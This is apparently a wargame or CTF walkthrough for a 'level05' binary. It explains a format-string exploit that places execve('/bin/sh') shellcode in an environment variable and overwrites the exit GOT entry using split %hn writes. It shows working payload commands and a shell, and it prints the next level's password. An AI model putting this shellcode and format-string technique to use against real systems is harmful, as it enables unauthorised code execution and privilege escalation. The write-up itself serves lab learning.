# Walkthrough level05

This binary do a fgets of 100 chars and use the result in first argument of printf.  
Override eip is not possible because we have an exit after the printf.
The only possible way to execute a shell is to replace exit plt address (`0x80497e1`)  
We can't write chars between 64 and 90 in ascii because the code transform this
chars with a XOR 32. To bypass this we write our shellcode in environment variable.  

Get the address of the beginning of the shellcode:

```bash
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
(gdb) x/s *environ
0xffffd873:      "SHELLCODE=(...)
```

Try to write the address of the shellcode in the address of exit:

```bash
(gdb) r < <(python -c 'print("\x08\x04\x97\xe0"[::-1] + "%4294957167d%10$n")')
Breakpoint 1, 0x08048513 in main ()
(gdb) x/xw 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376
```

We can see that doesn't work.  
It's because we can't write as much chars with printf.  
Try to write the address in two times.

```bash
Split the address to write in 2 bytes:
low = 0xd873 = 55411
high = 0xffff = 65535
nop shifting = 40
address1 + address2 + %Xd%10$n + "%Yd%11$n"
X = low - 8 + 40 = 55443
Y = high - low - 40 = 10084
```

Lets exploit this:

```bash
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
(python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55443d%10$hn%10084d%11$hn")'; cat) | $PWD/level05
...
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
